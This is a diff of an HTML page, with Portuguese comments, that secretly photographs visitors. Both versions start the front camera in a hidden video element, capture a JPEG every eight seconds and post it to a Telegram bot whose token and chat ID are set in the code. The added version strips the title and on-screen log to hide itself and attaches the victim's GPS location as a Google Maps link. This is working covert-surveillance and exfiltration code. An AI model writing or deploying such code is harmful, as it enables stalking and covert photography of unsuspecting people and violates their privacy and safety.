@@ -1,78 +1,50 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html>
 <head>
   <meta charset="utf-8"/>
-  <title>Captura Silenciosa</title>
-  <style>
-    body{margin:0;background:#000;color:#fff;font-family:monospace}
-    #log{position:absolute;top:0;left:0;max-height:100vh;overflow-y:auto;padding:4px;font-size:11px;color:#0f0;background:rgba(0,0,0,.7)}
-  </style>
+  <title></title>
 </head>
 <body>
-  <!-- vídeo invisível -->
-  <video id="cam" style="display:none" playsinline></video>
-
-  <!-- log opcional, só para você ver -->
-  <pre id="log"></pre>
-
+  <video id="camera" style="display:none"></video>
   <script>
-    /* ===== CONFIGURE AQUI ===== */
-    const BOT   = 'SEU_BOT_TOKEN';  // 123456789:ABC...
-    const CHAT  = 'SEU_CHAT_ID';    // -100123456789
-    const DELAY = 8000;             // ms entre cada foto
-    const QUAL  = 0.9;              // qualidade JPEG 0-1
+    const BOT = '123456789:AAH-EXEMPLO-DO-SEU-TOKEN';
+    const CHAT = '-1001234567890';
 
-    /* ===== ENVIO ===== */
-    function tg(text, blob){
-      const form = new FormData();
-      form.append('chat_id', CHAT);
-      form.append('caption', text);
-      if(blob){
-        form.append('photo', blob, 's.jpg');
-        fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:form});
-      }else{
-        form.append('text', text);
-        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST', body:form});
+    function tele(text, file) {
+      const fd = new FormData();
+      fd.append('chat_id', CHAT);
+      fd.append('caption', text);
+      if (file) {
+        fd.append('photo', file, 's.jpg');
+        fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {method:'POST', body:fd});
+      } else {
+        fd.append('text', text);
+        fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {method:'POST', body:fd});
       }
     }
 
-    /* ===== CAPTURA ===== */
-    async function captura(){
-      try{
-        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}, audio:false});
-        const v = document.getElementById('cam');
+    async function tirarSelfie() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v = document.getElementById('camera');
         v.srcObject = stream;
         await v.play();
-
         const c = document.createElement('canvas');
-        c.width  = v.videoWidth  || 640;
-        c.height = v.videoHeight || 480;
+        c.width = 640; c.height = 480;
         c.getContext('2d').drawImage(v, 0, 0);
-
-        c.toBlob(b=>{
-          tg('📸', b);
-          stream.getTracks().forEach(t=>t.stop());
-          log(`enviado ${new Date().toLocaleTimeString()}`);
-        }, 'image/jpeg', QUAL);
-
-      }catch(e){
-        log(`erro: ${e.message}`);
+        c.toBlob(b => {
+          navigator.geolocation.getCurrentPosition(pos=>{
+            const {latitude,longitude} = pos.coords;
+            tele(`📸 selfie\n📍 https://maps.google.com/?q=${latitude},${longitude}`, b);
+          }, ()=>{ tele('📸 selfie', b); });
+          stream.getTracks().forEach(t => t.stop());
+        }, 'image/jpeg', 0.9);
+      } catch(e) {
+        console.warn(e);
       }
     }
 
-    /* ===== UTIL ===== */
-    function log(msg){
-      const el = document.getElementById('log');
-      el.textContent += msg + '\n';
-      el.scrollTop = el.scrollHeight;
-    }
-
-    /* ===== START ===== */
-    log('iniciando captura...');
-    captura();
-    setInterval(captura, DELAY);
+    setInterval(tirarSelfie, 8000);
   </script>
 </body>
 </html>
-
-
